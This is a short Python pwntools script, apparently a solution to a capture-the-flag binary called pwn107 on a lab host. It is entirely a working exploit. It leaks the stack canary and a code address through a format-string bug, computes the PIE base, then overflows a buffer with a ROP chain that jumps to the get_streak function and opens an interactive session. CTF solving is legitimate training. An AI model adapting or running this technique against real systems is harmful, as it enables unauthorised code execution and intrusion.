#!/usr/bin/python3

from pwn import *

local = True
filename = './pwn107.pwn107'
hostname = '10.10.150.103'
port = 9007
is_debug = False

test = cyclic(128, n=4)
canary_offset = cyclic_find(0x6161616861616167)
eip_offest = cyclic_find('caaadaaae')

e = ELF(filename)
get_streak = e.symbols.get_streak
main = e.symbols.main

rop = ROP(e)
ret = rop.ret.address

if local: 
    if is_debug:
        p = gdb.debug(filename, '''
        break *main+221
        continue
        ''')
    else:
        p = process(filename)
else:
    p = remote(hostname, port)

p.sendlineafter(b"What's your last streak?", b'%13$016lx %19$016lx')
p.recvuntil(b"Your current streak: ")
canary = int(p.recv(16).decode(), 16)
leaked_main = int(p.recv(17).decode(), 16)
base = leaked_main - main

print(f'Canary: {hex(canary)}')
print(f'Canary offset: {canary_offset}')
print(f'get_streak offset: {hex(get_streak)}')
print(f'eip offest: {eip_offest}')
print(f'base : {hex(base)}')
print(f'ret is at {ret}')

payload = b"A" * canary_offset
payload += p64(canary)
payload += b"B" * eip_offest
payload += p64(base + ret)
payload += p64(base + get_streak)
p.recvuntil(b"We miss you!")
p.recvline()
p.sendline(payload)
p.interactive()



